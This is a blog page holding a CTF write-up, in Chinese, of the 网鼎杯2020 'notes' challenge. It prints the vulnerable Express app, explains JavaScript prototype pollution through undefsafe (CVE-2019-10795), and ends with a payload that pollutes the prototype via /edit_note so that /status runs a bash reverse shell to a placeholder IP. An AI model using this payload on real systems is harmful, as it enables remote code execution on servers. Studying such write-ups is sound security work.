@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>[网鼎杯2020青龙组]notes | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[网鼎杯2020青龙组]notes</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 20, 2024&nbsp;&nbsp;21:05:22</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a>
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/">ssti</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="网鼎杯2020青龙组-notes"><a href="#网鼎杯2020青龙组-notes" class="headerlink" title="[网鼎杯2020青龙组]notes"></a>[网鼎杯2020青龙组]notes</h2><p>压缩包解压后index.js：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Notes</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">owner</span> = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span> = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">write_note</span>(<span class="params">author, raw_note</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span>[(<span class="variable language_">this</span>.<span class="property">num</span>++).<span class="title function_">toString</span>()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        <span class="title function_">undefsafe</span>(r, id, <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit_note</span>(<span class="params">id, author, raw</span>) &#123;</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_all_notes</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">note_list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">remove_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">note_list</span>[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> <span class="title class_">Notes</span>();</span><br><span class="line">notes.<span class="title function_">write_note</span>(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> raw = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.<span class="title function_">write_note</span>(author, raw);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> enote = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.<span class="title function_">edit_note</span>(id, author, enote);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.<span class="title function_">remove_note</span>(id);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_all_notes</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_note</span>(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">stack</span>);</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="js原型链污染："><a href="#js原型链污染：" class="headerlink" title="js原型链污染："></a>js原型链污染：</h2><p>例子：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">object1 = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line">object1.<span class="property">__proto__</span>.<span class="property">foo</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">foo</span>);</span><br><span class="line">object2 = &#123;<span class="string">&quot;c&quot;</span>:<span class="number">1</span>, <span class="string">&quot;d&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object2.<span class="property">foo</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最终会输出两个 Hello World。为什么 object2 在没有设置 foo 属性的情况下，也会输出 Hello World 呢？就是因为在第二条语句中，我们对 object1 的原型对象设置了一个 foo 属性，而 object2 和 object1 一样，都是继承了 Object.prototype。在获取 object2.foo 时，由于 object2 本身不存在 foo 属性，就会往父类 Object.prototype 中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p>
+<p>要点：一直找同类的原型的属性，一直找到原型的原型为NULL为止</p>
+<h2 id="Undefsafe-模块原型链污染（CVE-2019-10795）"><a href="#Undefsafe-模块原型链污染（CVE-2019-10795）" class="headerlink" title="Undefsafe 模块原型链污染（CVE-2019-10795）"></a>Undefsafe 模块原型链污染（CVE-2019-10795）</h2><p>不光是 Merge 操作容易造成原型链污染，undefsafe 模块也可以原型链污染。undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性。</p>
+<p>总结来说undefsafe就是可以将一个以下的报错改成不报错，改成undefined</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">a</span>(object,<span class="string">&#x27;a.b.e&#x27;</span>))</span><br><span class="line"><span class="comment">// skysec</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">b</span>.<span class="property">e</span>)</span><br><span class="line"><span class="comment">// skysec</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">a</span>(object,<span class="string">&#x27;a.c.e&#x27;</span>))</span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">a</span>.<span class="property">c</span>.<span class="property">e</span>)</span><br><span class="line"><span class="comment">// TypeError: Cannot read property &#x27;e&#x27; of undefined</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="当-undefsafe-函数的第-2，3-个参数可控时，我们可以污染-object-对象中的值"><a href="#当-undefsafe-函数的第-2，3-个参数可控时，我们可以污染-object-对象中的值" class="headerlink" title="当 undefsafe() 函数的第 2，3 个参数可控时，我们可以污染 object 对象中的值"></a>当 undefsafe() 函数的第 2，3 个参数可控时，我们可以污染 object 对象中的值</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">a</span>(test,<span class="string">&#x27;__proto__.toString&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="keyword">return</span> <span class="string">&#x27;just a evil!&#x27;</span>&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this is &#x27;</span>+test)    <span class="comment">// 将test对象与字符串&#x27;this is &#x27;进行拼接</span></span><br><span class="line"><span class="comment">// this is just a evil!</span></span><br></pre></td></tr></table></figure>
+
+<p>回归本题可以发现：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;status路由器是可以将commands的东西全部命令执行</p>
+<p>而edit_note可以传三个参数（id，author，raw）并且进入undefsafe函数中进行第二三参数可以控制的函数中：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> enote = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.<span class="title function_">edit_note</span>(id, author, enote);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>我就可以直接&#x2F;edit_note</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=__proto__&amp;author=bash -i &gt; /dev/tcp/IP/2333 0&gt;&amp;1&amp;raw=111111;</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;status命令执行</p>
